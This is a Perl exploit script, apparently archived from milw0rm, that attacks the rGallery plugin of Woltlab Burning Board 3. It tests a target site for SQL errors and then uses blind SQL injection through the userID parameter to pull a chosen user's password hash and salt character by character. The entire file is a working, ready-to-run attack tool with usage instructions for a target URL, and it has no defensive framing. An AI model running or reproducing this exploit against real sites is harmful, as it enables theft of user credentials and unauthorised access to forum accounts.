#!/usr/bin/perl -w

use strict;
use LWP::Simple;

$| = 1;

print q {
#############################
## WBB3 Blind SQL-Injector ##
#### Exploit in rGallery ####
###### by Invisibility ######
#############################
\\\    Special greetz to     #
//  Katharsis/**/nobody     #
\\\    Gunner/**/Cheese      #
//          Thx ;)          #
#############################


};

if (@ARGV < 3) {
 print "Usage: wbb3sploit.pl [url] [user id] [User Gallery userID] \nExample: wbb3sploit.pl www.target.com 1 5\n";
 print "[User Gallery UserID] has to be the ID of a User, who has got pictures.\nExample: www.target.com/index.php?page=RGalleryUserGallery&userID=5\n";
 exit;
}

my $url = shift;
my $uid  = shift;
my $galid  = shift;

my $prefix;

my @charset = ('a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0');

print "~ Is it vulnerable?...\n";

my $chreq = get("http://".$url."/index.php?page=RGalleryUserGallery&userID='");

if (($chreq =~ m/Fatal error/i) || ($chreq =~ m/Invalid SQL/i)) {

print "Nice, seems to be vulnerable!\n";

} else {

print "Seems to be patched, sorry\n";
exit;

}

print "~ Checking Prefix...\n";

if ($chreq =~ m/_wcf/i) {

 print "~ Found Prefix '$1'\n";
 $prefix = $1;

} else {
 print "~ Can't find prefix, using 'wcf1_'\n";
 $prefix = "wcf1_";
}

print "~ Exploiting...\n";
print "~^~ Hash: ";

my $counter = 1;
my $countersalt = 1;

while($counter < 41) {

foreach(@charset) {

 my $ascode       = ord($_);
 my $result       = get("http://".$url."/index.php?page=RGalleryUserGallery&userID=".$galid."/**/AND/**/ascii(substring((SELECT/**/password/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),".$counter."))=".$ascode."");

 if (length($result) != 0) {
  if ($result =~ "Keine") {
  }
  else{
   print chr($ascode);
   $counter++;
   }
  }
 }
}
my $saltcheck = get("http://".$url."/index.php?page=RGalleryUserGallery&userID=".$galid."/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),1))>0");
if($saltcheck =~ "Keine")
{
}
else
{
print "\n~^~ Salt: ";
while($countersalt < 41) {

foreach(@charset) {

 my $ascodesalt       = ord($_);
 my $resultsalt       = get("http://".$url."/index.php?page=RGalleryUserGallery&userID=".$galid."/**/AND/**/ascii(substring((SELECT/**/salt/**/FROM/**/".$prefix."user/**/WHERE/**/userid=".$uid."),".$countersalt."))=".$ascodesalt."");

 if (length($resultsalt) != 0) {
  if ($resultsalt =~ "Keine") {
  }
  else{
   print chr($ascodesalt);
   $countersalt++;
   }
  }
 }
}
}
print "\n~ Done! Exploit by Invisibility\n";

# milw0rm.com [2009-03-23]
